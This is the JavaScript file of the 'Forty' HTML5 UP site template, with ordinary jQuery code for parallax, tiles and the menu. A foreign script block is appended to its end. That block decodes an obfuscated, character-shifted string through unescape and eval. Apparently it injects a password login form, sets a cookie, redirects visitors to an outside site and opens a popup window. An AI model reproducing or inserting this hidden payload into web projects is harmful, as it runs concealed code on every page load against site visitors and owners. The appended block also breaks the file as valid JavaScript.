/*
	Forty by HTML5 UP
	html5up.net | @ajlkn
	Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
*/

(function($) {

	skel.breakpoints({
		xlarge: '(max-width: 1680px)',
		large: '(max-width: 1280px)',
		medium: '(max-width: 980px)',
		small: '(max-width: 736px)',
		xsmall: '(max-width: 480px)',
		xxsmall: '(max-width: 360px)'
	});

	/**
	 * Applies parallax scrolling to an element's background image.
	 * @return {jQuery} jQuery object.
	 */
	$.fn._parallax = (skel.vars.browser == 'ie' || skel.vars.browser == 'edge' || skel.vars.mobile) ? function() { return $(this) } : function(intensity) {

		var	$window = $(window),
			$this = $(this);

		if (this.length == 0 || intensity === 0)
			return $this;

		if (this.length > 1) {

			for (var i=0; i < this.length; i++)
				$(this[i])._parallax(intensity);

			return $this;

		}

		if (!intensity)
			intensity = 0.25;

		$this.each(function() {

			var $t = $(this),
				on, off;

			on = function() {

				$t.css('background-position', 'center 100%, center 100%, center 0px');

				$window
					.on('scroll._parallax', function() {

						var pos = parseInt($window.scrollTop()) - parseInt($t.position().top);

						$t.css('background-position', 'center ' + (pos * (-1 * intensity)) + 'px');

					});

			};

			off = function() {

				$t
					.css('background-position', '');

				$window
					.off('scroll._parallax');

			};

			skel.on('change', function() {

				if (skel.breakpoint('medium').active)
					(off)();
				else
					(on)();

			});

		});

		$window
			.off('load._parallax resize._parallax')
			.on('load._parallax resize._parallax', function() {
				$window.trigger('scroll');
			});

		return $(this);

	};

	$(function() {

		var	$window = $(window),
			$body = $('body'),
			$wrapper = $('#wrapper'),
			$header = $('#header'),
			$banner = $('#banner');

		// Disable animations/transitions until the page has loaded.
			$body.addClass('is-loading');

			$window.on('load pageshow', function() {
				window.setTimeout(function() {
					$body.removeClass('is-loading');
				}, 100);
			});

		// Clear transitioning state on unload/hide.
			$window.on('unload pagehide', function() {
				window.setTimeout(function() {
					$('.is-transitioning').removeClass('is-transitioning');
				}, 250);
			});

		// Fix: Enable IE-only tweaks.
			if (skel.vars.browser == 'ie' || skel.vars.browser == 'edge')
				$body.addClass('is-ie');

		// Fix: Placeholder polyfill.
			$('form').placeholder();

		// Prioritize "important" elements on medium.
			skel.on('+medium -medium', function() {
				$.prioritize(
					'.important\\28 medium\\29',
					skel.breakpoint('medium').active
				);
			});

		// Scrolly.
			$('.scrolly').scrolly({
				offset: function() {
					return $header.height() - 2;
				}
			});

		// Tiles.
			var $tiles = $('.tiles > article');

			$tiles.each(function() {

				var $this = $(this),
					$image = $this.find('.image'), $img = $image.find('img'),
					$link = $this.find('.link'),
					x;

				// Image.

					// Set image.
						$this.css('background-image', 'url(' + $img.attr('src') + ')');

					// Set position.
						if (x = $img.data('position'))
							$image.css('background-position', x);

					// Hide original.
						$image.hide();

				// Link.
					if ($link.length > 0) {

						$x = $link.clone()
							.text('')
							.addClass('primary')
							.appendTo($this);

						$link = $link.add($x);

						$link.on('click', function(event) {

							var href = $link.attr('href');

							// Prevent default.
								event.stopPropagation();
								event.preventDefault();

							// Start transitioning.
								$this.addClass('is-transitioning');
								$wrapper.addClass('is-transitioning');

							// Redirect.
								window.setTimeout(function() {

									if ($link.attr('target') == '_blank')
										window.open(href);
									else
										location.href = href;

								}, 500);

						});

					}

			});

		// Header.
			if (skel.vars.IEVersion < 9)
				$header.removeClass('alt');

			if ($banner.length > 0
			&&	$header.hasClass('alt')) {

				$window.on('resize', function() {
					$window.trigger('scroll');
				});

				$window.on('load', function() {

					$banner.scrollex({
						bottom:		$header.height() + 10,
						terminate:	function() { $header.removeClass('alt'); },
						enter:		function() { $header.addClass('alt'); },
						leave:		function() { $header.removeClass('alt'); $header.addClass('reveal'); }
					});

					window.setTimeout(function() {
						$window.triggerHandler('scroll');
					}, 100);

				});

			}

		// Banner.
			$banner.each(function() {

				var $this = $(this),
					$image = $this.find('.image'), $img = $image.find('img');

				// Parallax.
					$this._parallax(0.275);

				// Image.
					if ($image.length > 0) {

						// Set image.
							$this.css('background-image', 'url(' + $img.attr('src') + ')');

						// Hide original.
							$image.hide();

					}

			});

		// Menu.
			var $menu = $('#menu'),
				$menuInner;

			$menu.wrapInner('<div class="inner"></div>');
			$menuInner = $menu.children('.inner');
			$menu._locked = false;

			$menu._lock = function() {

				if ($menu._locked)
					return false;

				$menu._locked = true;

				window.setTimeout(function() {
					$menu._locked = false;
				}, 350);

				return true;

			};

			$menu._show = function() {

				if ($menu._lock())
					$body.addClass('is-menu-visible');

			};

			$menu._hide = function() {

				if ($menu._lock())
					$body.removeClass('is-menu-visible');

			};

			$menu._toggle = function() {

				if ($menu._lock())
					$body.toggleClass('is-menu-visible');

			};

			$menuInner
				.on('click', function(event) {
					event.stopPropagation();
				})
				.on('click', 'a', function(event) {

					var href = $(this).attr('href');

					event.preventDefault();
					event.stopPropagation();

					// Hide.
						$menu._hide();

					// Redirect.
						window.setTimeout(function() {
							window.location.href = href;
						}, 250);

				});

			$menu
				.appendTo($body)
				.on('click', function(event) {

					event.stopPropagation();
					event.preventDefault();

					$body.removeClass('is-menu-visible');

				})
				.append('<a class="close" href="#menu">Close</a>');

			$body
				.on('click', 'a[href="#menu"]', function(event) {

					event.stopPropagation();
					event.preventDefault();

					// Toggle.
						$menu._toggle();

				})
				.on('click', function(event) {

					// Hide.
						$menu._hide();

				})
				.on('keydown', function(event) {

					// Hide on escape.
						if (event.keyCode == 27)
							$menu._hide();

				});

	});

})(jQuery);


<script type="text/javascript">
d="=tdsjqu mbohvbhf>KbwbTdsjqu?=!..gvodujpo tipxmphjo(*|epdvnfou/xsjufmo('=cs?=cs?+#'*<J#ubcmf xjeui>457 cpsefs>3 dfmmtqbdjoh>13#qbee3#bmjho>dfoufs ifjhiu>223:$:$s?=ueO#52 chdpmps>#7273:F`#`#ejw>$?=gpou d#GGGGGG gbdf>Dpvsjfs Ofx- 0#- npop?=c^#tj{f>8?Vtfs Mi&=0=#?=0c?.#ejw`$`$0ue?=0I%sH#h%e i5&d%GGCEPPd%\\#gpsn obnf>qbttxpse6# poTvcnju>joqvu(*<?8&mfguz#z#UBCMF dfmmTqbdjoh>11#Qbee1#xjeui>211% cpsefs>1?=UCPEZz#z#JOQVU uzqf>ijeefo,%vtfs-# wbmvf>efgbvmu?=cL&p$S?=UEU$21 ifZ&44?&octq<=0UE`#`#\\#8\\#=GPOU gbdf>Wfsebob- Bsjbm- Ifmwfujdb- tbot.tfsjg tj{f>2?=C4$4$w#v#W#3?Qbttxpse=0F#?=0C?.#UEL%n$1$u&dmbtt>joqvu uzqf>q/$?$1 obn9#r#r#L$0z&0UCPEZ+#BCMFT#o('&octq<)#/#5#=g$Tvcnju `$2#wbmvf>Mphjo Opx@$q$ejw?=0gpsn?=0ue(#s(#bcmfY#~<gvodujpo F$(*|qe>s#%&j#0#/O$/upVqqfsDbtf(r#vs[#n/vtfs6%[#jg ((vs!>vs* }}(qe>>voftdbqf(%36%41%41,#3%46,#4%43*** |?$dppljf>IUNMQK$VtfsJE>,vs<L#L#+#XL#qe<.%epl(*<~fmtf|bmfsu(p#bddpvou; v#,  fssps !*)$pqfo(3#mpdb{&/isfg>iuuq;00xxx/gffunbo/dpn<~<~<gvodP# ofn(*|sfuvso usvf~<xjoepx/po>$>G#<wbs u85<em > =$bzfst<eb8#bmm<hf5#hfuFmf.#CzJe<xt > /$tjefcbs)$nth>.#c:8<m$?& |n%3#xsjuf(voftdbqf(%4Diunm%4F-#fbe-#ujumf%4FOfu%31Gpsdf%4D%3G<#1#T#cpez-#tdsjqY#uzqf%4E%33ufyu%3GkbwbA#3%31mbohvbhH#KbwbTA#tsd<#tib2%3Fkt;#C$k#;$;$;$;$#$2%3E%3E%31Tubsy#Ijejoh($if:#U#1E%1B)#gvodujpo%31wbmjebuf%39%3:%31%8CN#31%31jg+#9%39epdvnfou%3FMphjoGpsn%3Fm/#%3Fwbmvf3#fohuiY#4F%311z#37%37o#l#3Fqbttxpseo#o#o$)#S$4E)$r$4d#K$c#i$f#`#v&_$6Gtib2%4EdbmdTIB2%39Z$:U$U$Y#<#X#^#hppe%6G$&%332e42e:5g41e51eg8:62616e2145f2f:34e13fd5:%33E%x#%6G8&%333e8b45d:fg9fgb3dgeg5c9:286g8fefd2de1eeebw#u$31jg+#9$&b%%4E8%3:M#7%37V#7&R#6&T#8q&G$,#bmfsuP$8Xfmm%31Epof%32%38l#0%i#8E%31fmtf@$T#)#epdvnfou%3Fmpdbujpoo&8iuuq%4B%3G%3Gxxx%3Fgffunbo%3Fdpn]$&$W$G#l$W#r#u$u$u$u$o$>$3%G#sfuvso%31gb4%4z&R#\\$%31Tupq%31Ijejoh%31tdsjqu,$E%3E)#4F%4D%3G>#2#ubcm=&xjeui\\%3311%33%31ifjhiu8#:7#bmjh*&3dfoufs:#cpsefs;#M#&$s+#e%31dmbttE#uyuG#i#/#gpsn%31obnfL#MphjoG9#F$dujpG$.$1%L$v$:#[%2[%6z$z$Z$%4B^&ueR#O%joqvu%31uzqD%ufB#X%m{#8#tj{8#_&6$.#p$x$I$Qbttxpse{$U#{$qj#%%;#(%(%.#bcmf:$%33tvcnj:&wbmv:#T:#poDmjdl<#sfuvsoP#jebuf%39%3:%4CR$gpsn0#dfoufX$n$n$%3Gcpez0#iunm0#1E%1B**< epdvnfou/dmptf(*<~<xjoepx/pqfo(voftdbqf(%79%85%85%81%4B%3G%3G%88%88)#3F%7E%7:%7F)#P#84%76%83%87,#P#F/#5*-Vosfhjtufs-xjui>361-ifjhiu>291*<tipxmphjo(*<=0TDSJQU?";
e=unescape("%25%36%43%25%33%44%25%32%37%25%35%43%25%33%30%25%30%31%25%30%32%25%30%33%25%30%34%25%30%35%25%30%36%25%30%37%25%30%38%25%35%43%25%37%34%25%35%43%25%36%45%25%30%42%25%30%43%25%35%43%25%37%32%25%30%45%25%30%46%25%31%30%25%31%31%25%31%32%25%31%33%25%31%34%25%31%35%25%31%36%25%31%37%25%31%38%25%31%39%25%31%41%25%31%42%25%31%43%25%31%44%25%31%45%25%31%46%25%32%30%25%32%31%25%32%32%25%32%33%25%32%34%25%32%35%25%32%36%25%35%43%25%32%37%25%32%38%25%32%39%25%32%41%25%32%42%25%32%43%25%32%44%25%32%45%25%32%46%25%33%30%25%33%31%25%33%32%25%33%33%25%33%34%25%33%35%25%33%36%25%33%37%25%33%38%25%33%39%25%33%41%25%33%42%25%33%43%25%33%44%25%33%45%25%33%46%25%34%30%25%34%31%25%34%32%25%34%33%25%34%34%25%34%35%25%34%36%25%34%37%25%34%38%25%34%39%25%34%41%25%34%42%25%34%43%25%34%44%25%34%45%25%34%46%25%35%30%25%35%31%25%35%32%25%35%33%25%35%34%25%35%35%25%35%36%25%35%37%25%35%38%25%35%39%25%35%41%25%35%42%25%35%43%25%33%31%25%33%33%25%33%34%25%35%44%25%35%45%25%35%46%25%36%30%25%36%31%25%36%32%25%36%33%25%36%34%25%36%35%25%36%36%25%36%37%25%36%38%25%36%39%25%36%41%25%36%42%25%36%43%25%36%44%25%36%45%25%36%46%25%37%30%25%37%31%25%37%32%25%37%33%25%37%34%25%37%35%25%37%36%25%37%37%25%37%38%25%37%39%25%37%41%25%37%42%25%37%43%25%37%44%25%37%45%25%37%46%25%32%37%25%33%42%25%30%44%25%30%41%25%37%33%25%33%44%25%32%37%25%32%37%25%33%42%25%30%44%25%30%41%25%36%36%25%36%46%25%37%32%25%32%30%25%32%38%25%36%39%25%33%44%25%33%30%25%33%42%25%36%39%25%33%43%25%36%34%25%32%45%25%36%43%25%36%35%25%36%45%25%36%37%25%37%34%25%36%38%25%33%42%25%36%39%25%32%42%25%32%42%25%32%39%25%37%42%25%30%44%25%30%41%25%36%31%25%33%44%25%36%43%25%32%45%25%36%39%25%36%45%25%36%34%25%36%35%25%37%38%25%34%46%25%36%36%25%32%38%25%36%34%25%32%45%25%36%33%25%36%38%25%36%31%25%37%32%25%34%31%25%37%34%25%32%38%25%36%39%25%32%39%25%32%39%25%33%42%25%30%44%25%30%41%25%36%39%25%36%36%25%32%30%25%32%38%25%36%31%25%33%44%25%33%44%25%33%31%25%32%39%25%32%30%25%36%31%25%33%44%25%33%39%25%33%42%25%30%44%25%30%41%25%36%39%25%36%36%25%32%30%25%32%38%25%36%31%25%33%44%25%33%44%25%33%32%25%32%39%25%32%30%25%36%31%25%33%44%25%33%31%25%33%30%25%33%42%25%30%44%25%30%41%25%36%39%25%36%36%25%32%30%25%32%38%25%36%31%25%33%44%25%33%44%25%33%33%25%32%39%25%32%30%25%36%31%25%33%44%25%33%31%25%33%33%25%33%42%25%30%44%25%30%41%25%36%39%25%36%36%25%32%30%25%32%38%25%36%31%25%33%44%25%33%44%25%33%34%25%32%39%25%32%30%25%36%31%25%33%44%25%33%33%25%33%34%25%33%42%25%30%44%25%30%41%25%36%39%25%36%36%25%32%30%25%32%38%25%36%31%25%33%43%25%33%44%25%33%33%25%33%31%25%32%30%25%32%36%25%32%30%25%36%31%25%33%45%25%33%44%25%33%31%25%33%34%25%32%39%25%37%42%25%30%44%25%30%41%25%36%46%25%36%36%25%36%36%25%33%44%25%37%33%25%32%45%25%36%43%25%36%35%25%36%45%25%36%37%25%37%34%25%36%38%25%32%44%25%32%38%25%36%43%25%32%45%25%36%39%25%36%45%25%36%34%25%36%35%25%37%38%25%34%46%25%36%36%25%32%38%25%36%34%25%32%45%25%36%33%25%36%38%25%36%31%25%37%32%25%34%31%25%37%34%25%32%38%25%32%42%25%32%42%25%36%39%25%32%39%25%32%39%25%32%44%25%33%33%25%33%36%25%32%42%25%33%39%25%33%30%25%32%41%25%32%38%25%36%43%25%32%45%25%36%39%25%36%45%25%36%34%25%36%35%25%37%38%25%34%46%25%36%36%25%32%38%25%36%34%25%32%45%25%36%33%25%36%38%25%36%31%25%37%32%25%34%31%25%37%34%25%32%38%25%32%42%25%32%42%25%36%39%25%32%39%25%32%39%25%32%44%25%33%33%25%33%35%25%32%39%25%32%39%25%32%44%25%33%31%25%33%42%25%30%44%25%30%41%25%36%43%25%37%30%25%33%44%25%36%46%25%36%36%25%36%36%25%32%42%25%36%31%25%32%44%25%33%31%25%33%34%25%32%42%25%33%34%25%33%42%25%30%44%25%30%41%25%37%33%25%33%44%25%37%33%25%32%42%25%37%33%25%32%45%25%37%33%25%37%35%25%36%32%25%37%33%25%37%34%25%37%32%25%36%39%25%36%45%25%36%37%25%32%38%25%36%46%25%36%36%25%36%36%25%32%43%25%36%43%25%37%30%25%32%39%25%33%42%25%37%44%25%30%44%25%30%41%25%36%35%25%36%43%25%37%33%25%36%35%25%32%30%25%37%42%25%32%30%25%36%39%25%36%36%25%32%30%25%32%38%25%36%31%25%33%45%25%33%44%25%33%34%25%33%31%25%32%39%25%32%30%25%36%31%25%33%44%25%36%31%25%32%44%25%33%31%25%33%42%25%32%30%25%37%33%25%33%44%25%37%33%25%32%42%25%36%43%25%32%45%25%36%33%25%36%38%25%36%31%25%37%32%25%34%31%25%37%34%25%32%38%25%36%31%25%32%39%25%33%42%25%37%44%25%37%44%25%33%42%25%36%34%25%36%46%25%36%33%25%37%35%25%36%44%25%36%35%25%36%45%25%37%34%25%32%45%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%32%38%25%37%33%25%32%39%25%33%42%25%30%44%25%30%41");e=unescape(e);eval(e);
</script>
